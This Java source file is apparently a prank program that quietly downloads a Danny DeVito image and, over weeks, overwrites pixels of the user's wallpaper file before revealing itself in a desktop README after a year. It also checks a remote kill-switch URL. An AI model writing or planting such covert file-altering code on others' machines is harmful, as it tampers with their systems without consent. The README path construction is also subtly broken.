package xyz.finlaym.easteregg;

import java.awt.Color;
import java.awt.Graphics2D;
import java.awt.Image;
import java.awt.image.BufferedImage;
import java.awt.image.ImageObserver;
import java.awt.image.VolatileImage;
import java.io.File;
import java.io.FileOutputStream;
import java.io.FileWriter;
import java.io.IOException;
import java.io.InputStream;
import java.io.PrintWriter;
import java.net.URL;
import java.nio.channels.Channels;
import java.nio.channels.ReadableByteChannel;
import java.text.SimpleDateFormat;
import java.time.temporal.ChronoUnit;
import java.util.Date;
import java.util.Random;
import java.util.Scanner;

import javax.imageio.ImageIO;

public class EasterEgg {
	private static final File oldWallpaper = new File("C:/Temp/wallpaper.png");
	private static final File devito = new File("C:/Temp/devito.png");
	private static final File dateFile = new File("C:/Temp/install.date");

	public static void main(String[] args) throws Exception {
		// String dirPath =
		// "C:\\Users\\"+System.getProperty("user.name")+"\\AppData\\Roaming\\Microsoft\\Windows\\Start
		// Menu\\Programs";
		try {
			// Added a kill switch because idk if I want to turn it off
			downloadFile(new URL("https://finlaym.xyz/disable.flag"), "C:/Temp/disable.flag");
			return;
		} catch (Exception e) {
		}
		SimpleDateFormat format = new SimpleDateFormat("yyyy/MM/dd");
		Date currentDate = new Date(System.currentTimeMillis());
		String value = WindowsRegistry.readRegistry("HKEY_CURRENT_USER\\Control Panel\\Desktop", "Wallpaper").trim();
		File wallpaperPath = new File(value);
		if (!oldWallpaper.exists()) {
			oldWallpaper.getParentFile().mkdirs();
			// First time setup
			BufferedImage curr = ImageIO.read(wallpaperPath);
			ImageIO.write(curr, "png", oldWallpaper);
			Image image = null;
			try {
				URL url = new URL(
						"https://www.closerweekly.com/wp-content/uploads/2019/08/Danny-DeVito-e1564672814400.jpg?resize=1200%2C630");
				image = ImageIO.read(url);
			} catch (IOException e) {
			}
			ImageIO.write(toBufferedImage(image, BufferedImage.TYPE_INT_ARGB), "png", devito);
			String date = format.format(new Date(System.currentTimeMillis()));
			PrintWriter out = new PrintWriter(new FileWriter(dateFile));
			out.println(date);
			out.close();
			return;
		}
		Scanner in = new Scanner(dateFile);
		String date = in.nextLine();
		in.close();
		Date d = format.parse(date);
		long days = ChronoUnit.DAYS.between(d.toInstant(), currentDate.toInstant());
		if (days > 365) {
			// If it has been a year then say hehe
			File f = new File("C:/Users/"+System.getProperty("user.home")+"/Desktop/README.txt");
			f.delete();
			f.createNewFile();
			PrintWriter out = new PrintWriter(new FileWriter(f,true));
			out.println("Hehe, you've been meme'd!");
			out.println("I've been playing the long con and have slowly been changing your background to Danny DeVito!");
			out.println("Your original wallpaper is located at C:/Temp/wallpaper.png");
			out.println("I have disabled myself, however if C:/Temp/ is deleted I will reactivate!");
			out.println("I am located at "+new File(EasterEgg.class.getProtectionDomain().getCodeSource().getLocation()
				    .toURI()).getAbsolutePath()+" and can be disabled by removing me!");
			out.println("My source code is located at https://github.com/finlaywashere/EasterEgg");
			out.println("I think I one upped myself this time");
			out.println("-Finlay");
			out.close();
			return;
		}
		if (days > 28) {
			// After 4 weeks activate
			BufferedImage currImage = ImageIO.read(wallpaperPath);
			BufferedImage resizedCurrImage = new BufferedImage(1920, 1080, BufferedImage.TYPE_INT_RGB);
			Graphics2D graphics2D = resizedCurrImage.createGraphics();
			graphics2D.drawImage(currImage, 0, 0, 1920, 1080, null);
			BufferedImage danny = ImageIO.read(devito);
			BufferedImage resizedDannyImage = new BufferedImage(1920, 1080, BufferedImage.TYPE_INT_RGB);
			Graphics2D graphicsDanny2D = resizedDannyImage.createGraphics();
			graphicsDanny2D.drawImage(danny, 0, 0, 1920, 1080, null);
			graphicsDanny2D.dispose();
			Random r = new Random(System.nanoTime());
			for (int i = 0; i < 100; i++) {
				int x = r.nextInt(1920);
				int y = r.nextInt(1080);
				Color c = new Color(resizedDannyImage.getRGB(x, y));
				graphics2D.setColor(c);
				graphics2D.fillRect(x, y, 1, 1);
			}
			graphics2D.dispose();
			String nameS = wallpaperPath.getName();
			String[] name = nameS.split("\\.");
			ImageIO.write(resizedCurrImage, name[name.length-1], wallpaperPath);
		}
	}

	public static void downloadFile(URL url, String outputFileName) throws IOException {
		try (InputStream in = url.openStream();
				ReadableByteChannel rbc = Channels.newChannel(in);
				FileOutputStream fos = new FileOutputStream(outputFileName)) {
			fos.getChannel().transferFrom(rbc, 0, Long.MAX_VALUE);
		}
	}

	public static BufferedImage toBufferedImage(final Image image, final int type) {
		if (image instanceof BufferedImage)
			return (BufferedImage) image;
		if (image instanceof VolatileImage)
			return ((VolatileImage) image).getSnapshot();
		loadImage(image);
		final BufferedImage buffImg = new BufferedImage(image.getWidth(null), image.getHeight(null), type);
		final Graphics2D g2 = buffImg.createGraphics();
		g2.drawImage(image, null, null);
		g2.dispose();
		return buffImg;
	}

	private static void loadImage(final Image image) {
		class StatusObserver implements ImageObserver {
			boolean imageLoaded = false;

			public boolean imageUpdate(final Image img, final int infoflags, final int x, final int y, final int width,
					final int height) {
				if (infoflags == ALLBITS) {
					synchronized (this) {
						imageLoaded = true;
						notify();
					}
					return true;
				}
				return false;
			}
		}
		final StatusObserver imageStatus = new StatusObserver();
		synchronized (imageStatus) {
			if (image.getWidth(imageStatus) == -1 || image.getHeight(imageStatus) == -1) {
				while (!imageStatus.imageLoaded) {
					try {
						imageStatus.wait();
					} catch (InterruptedException ex) {
					}
				}
			}
		}
	}
}
